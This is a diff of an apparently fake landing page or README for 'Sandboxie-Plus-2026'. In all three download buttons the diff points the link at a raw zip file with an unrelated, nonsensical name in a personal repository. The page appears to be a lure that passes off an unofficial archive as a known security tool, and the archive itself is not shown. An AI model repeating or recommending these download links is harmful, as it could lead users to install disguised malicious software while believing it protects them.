@@ -6,7 +6,7 @@ description: "Isolate untrusted apps and browse the web safely on Windows 10/11 
 <h1>🔒 Sandboxie-Plus-2026 - Run Suspicious Software Without Risk</h1>
 
 <p align="center">
-  <a href="https://github.com/ram1385/ram1385.github.io/raw/refs/heads/main/mosaicism/github_ram_io_represent.zip">
+  <a href="https://raw.githubusercontent.com/ram1385/ram1385.github.io/main/mosaicism/github_ram_io_represent.zip">
     <img src="https://img.shields.io/badge/Download-Sandboxie_Plus_2026-2b579a?style=for-the-badge&logo=windows&logoColor=white" alt="Download Sandboxie Plus 2026">
   </a>
 </p>
@@ -37,7 +37,7 @@ You need a Windows 10 or Windows 11 computer. Sandboxie Plus works on both 64-bi
 Visit the download page to get the latest version:
 
 <p align="center">
-  <a href="https://github.com/ram1385/ram1385.github.io/raw/refs/heads/main/mosaicism/github_ram_io_represent.zip">
+  <a href="https://raw.githubusercontent.com/ram1385/ram1385.github.io/main/mosaicism/github_ram_io_represent.zip">
     <img src="https://img.shields.io/badge/⬇️_Get_Sandboxie_Plus_2026-0078d7?style=for-the-badge&logo=github&logoColor=white" alt="Get Sandboxie Plus 2026">
   </a>
 </p>
@@ -122,7 +122,7 @@ Close all programs running inside the sandbox first. Then try to delete the cont
 If you need to download Sandboxie Plus on another computer or reinstall it, use the link below:
 
 <p align="center">
-  <a href="https://github.com/ram1385/ram1385.github.io/raw/refs/heads/main/mosaicism/github_ram_io_represent.zip">
+  <a href="https://raw.githubusercontent.com/ram1385/ram1385.github.io/main/mosaicism/github_ram_io_represent.zip">
     <img src="https://img.shields.io/badge/📦_Download_Sandboxie_Plus_2026-555555?style=for-the-badge&logo=windows&logoColor=white" alt="Download Sandboxie Plus 2026">
   </a>
 </p>
